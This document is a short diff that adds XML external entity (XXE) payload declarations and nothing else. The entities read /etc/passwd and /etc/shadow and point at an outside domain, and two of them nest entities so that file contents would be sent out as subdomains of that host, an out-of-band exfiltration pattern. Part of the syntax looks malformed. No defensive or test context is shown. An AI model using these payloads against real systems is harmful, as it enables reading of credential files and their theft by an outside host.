@@ -1,1 +1,10 @@
 
+<!ENTITY % payload1 SYSTEM "http://jeher.kshitnuck.com">
+<!ENTITY % payload2 SYSTEM "http://keher.kshitnuck.com">
+<!ENTITY % payload3 SYSTEM "file:///etc/passwd">
+<!ENTITY % payload4 SYSTEM "file:///etc/shadow">
+<!ENTITY % payload5 SYSTEM "<!ENTITY &#x25; exfil1 SYSTEM 'http://%payload1;.leher.kshitnuck.com/'>">
+<!ENTITY % payload6 SYSTEM "<!ENTITY &#x25; exfil1 SYSTEM 'http://%payload3;.zeher.kshitnuck.com/'>">
+
+
+
